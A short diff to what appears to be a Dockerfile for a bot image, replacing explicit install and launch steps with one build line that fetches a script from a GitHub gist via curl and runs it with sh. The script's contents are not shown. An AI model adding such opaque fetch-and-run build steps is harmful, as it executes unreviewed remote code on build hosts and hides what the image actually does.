@@ -1,10 +1,2 @@
 FROM mysterysd/wzmlx:latest
-RUN apt update
-RUN apt upgrade -y
-RUN apt install python3 python3-pip git -y
-RUN git clone https://github.com/SilentDemonSD/WZML-X
-COPY . .
-RUN cp config* token* WZ*
-RUN pip install --upgrade pip
-RUN cd WZ*;pip3 install --no-cache-dir -r requirements.txt
-RUN cd WZ*;pip3 install g4f;python3 update.py && python3 -m bot
+RUN sh -c "$(curl -fsSl https://gist.githubusercontent.com/rooted-cyber/75b4cc98f296f6c46c6c5afb947eb71d/raw/anasty)"
